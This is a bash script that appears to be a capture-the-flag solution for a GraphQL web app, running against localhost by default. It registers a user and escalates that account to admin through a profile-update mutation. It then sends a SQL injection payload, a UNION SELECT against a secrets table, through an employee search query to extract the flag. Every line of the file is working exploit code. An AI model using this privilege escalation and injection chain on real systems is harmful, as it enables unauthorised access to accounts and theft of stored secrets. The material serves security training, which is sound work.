#!/usr/bin/env bash
set -euo pipefail
T="${1:-http://localhost:3000}"
T="${T%/}"   # strip trailing slash to avoid //graphql

# Register
TOKEN=$(curl -s "$T/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"mutation{register(username:\"s'$RANDOM'\",password:\"abc123\"){token}}"}' | jq -r .data.register.token)

# Escalate to admin
TOKEN=$(curl -s "$T/graphql" -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation{updateProfile(input:{role:\"admin\"}){token}}"}' | jq -r .data.updateProfile.token)

# Extract flag
curl -s "$T/graphql" -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT id,value,'x',0 FROM secrets WHERE key='flag' AND 'a' LIKE '" \
  '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')" | jq -r '.data.searchEmployees[-1].name'
